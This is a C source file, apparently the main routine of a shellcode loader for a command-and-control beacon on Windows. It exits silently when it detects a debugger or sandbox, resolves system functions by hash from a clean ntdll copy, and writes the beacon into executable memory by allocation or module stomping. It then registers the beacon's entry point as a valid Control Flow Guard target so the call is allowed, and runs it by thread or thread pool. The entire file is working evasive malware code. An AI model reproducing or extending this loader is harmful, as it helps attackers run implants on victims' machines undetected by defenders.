#include "Common.h"
#include "Constexpr.h"
#include "Loader.h"

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL

FUNC PVOID NaxAllocExec(
    _In_ PVOID BeaconSrc,
    _In_ ULONG BeaconSize ) {

    STARDUST_INSTANCE

    PVOID  exec_buf  = NULL;
    SIZE_T copy_size = ALIGN_UP( BeaconSize, LDR_PAGE_SIZE );
    ULONG  old_prot  = 0;

    NTSTATUS st = ( (pNtAllocateVirtualMemory)SCAPI(NtAllocateVirtualMemory).Stub )(
        NtCurrentProcess(), &exec_buf, 0, &copy_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !NT_SUCCESS(st) || !exec_buf )
        return NULL;

    MmCopy( exec_buf, BeaconSrc, BeaconSize );

    st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
        NtCurrentProcess(), &exec_buf, &copy_size, PAGE_EXECUTE_READ, &old_prot );
    if ( !NT_SUCCESS(st) )
        return NULL;

    return exec_buf;
}

#endif

FUNC VOID Main(
    _In_ PVOID Param ) {

    STARDUST_INSTANCE

    PVOID hdr        = { 0 };
    PVOID beacon_src = { 0 };
    PVOID entry      = { 0 };

    // 1) Anti-analysis: bail silently on debugger/sandbox signals.
    if ( !NaxAntiAnalysis() )
        return;

    // 2) Resolve modules.
    if ( !(MOD(Kernel32) = LdrModulePeb(H_MODULE_KERNEL32)) )
        return;

    // In-process ntdll is only used for non-sensitive thread-pool APIs.
    if ( !(MOD(Ntdll) = LdrModulePeb(H_MODULE_NTDLL)) )
        return;

    // 3) Resolve APIs from the clean ntdll copy and kernel32.
    API(LdrLoadDll) = (pLdrLoadDll)LdrFunction( MOD(CleanNtdll), HASH_STR("LdrLoadDll") );

    API(VirtualProtect) = (pVirtualProtect)LdrFunction( MOD(Kernel32), HASH_STR("VirtualProtect") );
    API(LoadLibraryExW) = (pLoadLibraryExW)LdrFunction( MOD(Kernel32), HASH_STR("LoadLibraryExW") );
    API(GetProcessMitigationPolicy) = (pGetProcessMitigationPolicy)LdrFunction( MOD(Kernel32), HASH_STR("GetProcessMitigationPolicy") );

    MOD(Kernelbase) = LdrModulePeb( HASH_STR("KERNELBASE.DLL") );
    if ( MOD(Kernelbase) ) {
        API(SetProcessValidCallTargets) = (BOOL (WINAPI *)(HANDLE,PVOID,SIZE_T,ULONG,PVOID))
            LdrFunction( MOD(Kernelbase), HASH_STR("SetProcessValidCallTargets") );
    }

#if NAX_EXEC_MODE == NAX_EXEC_THREAD
    API(CreateThread) = (pCreateThread)LdrFunction( MOD(Kernel32), HASH_STR("CreateThread") );
#elif NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    API(TpAllocWork)   = (pTpAllocWork)LdrFunction(   MOD(Ntdll), HASH_STR("TpAllocWork") );
    API(TpPostWork)    = (pTpPostWork)LdrFunction(    MOD(Ntdll), HASH_STR("TpPostWork") );
    API(TpReleaseWork) = (pTpReleaseWork)LdrFunction( MOD(Ntdll), HASH_STR("TpReleaseWork") );
#endif

    if ( !API(LdrLoadDll) || !API(VirtualProtect) )
        return;

    // 4) Parse NaxHeader v2.
    hdr = LOADER_END();

    ULONG magic       = HDR_U32( hdr, NAX_HDR_OFF_MAGIC );
    ULONG beacon_size = HDR_U32( hdr, NAX_HDR_OFF_BEACON_SZ );

    // v1 fallback.
    if ( magic != NAX_HDR_MAGIC ) {
        beacon_size = magic;
        beacon_src  = C_PTR( U_PTR(hdr) + 4 );

        if ( !beacon_size || beacon_size > 256 * 1024 )
            return;

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
        entry = NaxAllocExec( beacon_src, beacon_size );
#else
        entry = beacon_src;
#endif
        if ( !entry )
            return;

        ( (VOID (*)(VOID))entry )();
        return;
    }

    if ( !beacon_size || beacon_size > 512 * 1024 )
        return;

    beacon_src = C_PTR( U_PTR(hdr) + NAX_HDR_SIZE );

    // 5) Place beacon into executable memory.
#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    ULONG  pdata_size = HDR_U32( hdr, NAX_HDR_OFF_PDATA_SZ );
    ULONG  xdata_size = HDR_U32( hdr, NAX_HDR_OFF_XDATA_SZ );
    ULONG  text_rva   = HDR_U32( hdr, NAX_HDR_OFF_TEXT_RVA );
    PWCHAR dll_name   = HDR_WSTR( hdr, NAX_HDR_OFF_DLL_NAME );
    PVOID  pdata_src  = C_PTR( U_PTR(beacon_src) + beacon_size );
    PVOID  xdata_src  = C_PTR( U_PTR(pdata_src) + pdata_size );

    entry = NaxModuleStomp( hdr, beacon_src, beacon_size,
                            pdata_src, pdata_size, xdata_src, xdata_size,
                            text_rva, dll_name );
#elif NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
    entry = NaxAllocExec( beacon_src, beacon_size );
#endif

    if ( !entry )
        return;

    // 6) CFG: whitelist beacon entry in stomped DLL.
#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    if ( API(GetProcessMitigationPolicy) && API(SetProcessValidCallTargets) && Instance()->StompDllBase ) {
        BYTE policy[4] = { 0 };
        if ( API(GetProcessMitigationPolicy)( (HANDLE)-1, 7, policy, 4 ) && (policy[0] & 1) ) {
            PIMAGE_NT_HEADERS cfgNt = NaxPeHeaders( Instance()->StompDllBase );
            if ( cfgNt ) {
                SIZE_T cfgLen = ALIGN_UP( cfgNt->OptionalHeader.SizeOfImage, LDR_PAGE_SIZE );
                struct { ULONG_PTR Offset; ULONG_PTR Flags; } cfg = {
                    U_PTR(entry) - U_PTR(Instance()->StompDllBase),
                    1   // CFG_CALL_TARGET_VALID
                };
                API(SetProcessValidCallTargets)( (HANDLE)-1, Instance()->StompDllBase, cfgLen, 1, &cfg );
            }
        }
    }
#endif

    // 7) Transfer execution.
#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    NaxExecThreadPool( entry );
#elif NAX_EXEC_MODE == NAX_EXEC_THREAD
    NaxExecThread( entry );
#endif
}
